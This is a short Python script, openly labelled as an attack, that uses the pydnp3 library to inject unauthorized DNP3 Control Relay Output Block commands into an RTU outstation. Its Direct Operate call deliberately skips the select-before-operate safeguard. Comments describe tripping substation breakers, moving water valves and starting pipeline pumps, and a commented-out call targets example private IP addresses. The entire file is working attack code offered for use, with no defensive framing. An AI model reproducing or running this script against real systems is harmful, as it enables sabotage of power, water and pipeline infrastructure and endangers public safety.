#!/usr/bin/env python3
"""
DNP3 Control Relay Output Block (CROB) injection
Send unauthorized control commands to RTU
"""

from pydnp3 import opendnp3, asiodnp3, asiopal

def dnp3_crob_attack(master_ip, outstation_ip, point_index):
    """
    Send DIRECT OPERATE command to DNP3 outstation
    Bypasses SELECT-BEFORE-OPERATE safety mechanism
    """
    # Initialize DNP3 master
    manager = asiodnp3.DNP3Manager(1)

    # Create channel
    channel = manager.AddTCPClient(
        "attack_channel",
        opendnp3.levels.NORMAL,
        asiopal.ChannelRetry(),
        outstation_ip,
        "0.0.0.0",
        20000,
        asiodnp3.LinkConfig(False, False)
    )

    # Create master
    soe_handler = asiodnp3.PrintingSOEHandler()
    master_app = asiodnp3.DefaultMasterApplication()
    stack_config = asiodnp3.MasterStackConfig()

    master = channel.AddMaster(
        "attack_master",
        soe_handler,
        master_app,
        stack_config
    )

    master.Enable()

    # Build CROB
    crob = opendnp3.ControlRelayOutputBlock(
        opendnp3.ControlCode.LATCH_ON,  # Turn ON
        1,      # Count
        100,    # On-time (ms)
        100     # Off-time (ms)
    )

    # Send DIRECT OPERATE (bypasses SELECT)
    print(f"[*] Sending DIRECT OPERATE to point {point_index}")
    master.DirectOperate(crob, point_index)

    print("[+] CROB command sent (breaker may have tripped)")

    # For substation: This could trip circuit breakers
    # For water: This could open/close valves
    # For pipeline: This could activate pumps

# dnp3_crob_attack('192.168.1.50', '192.168.1.100', point_index=0)
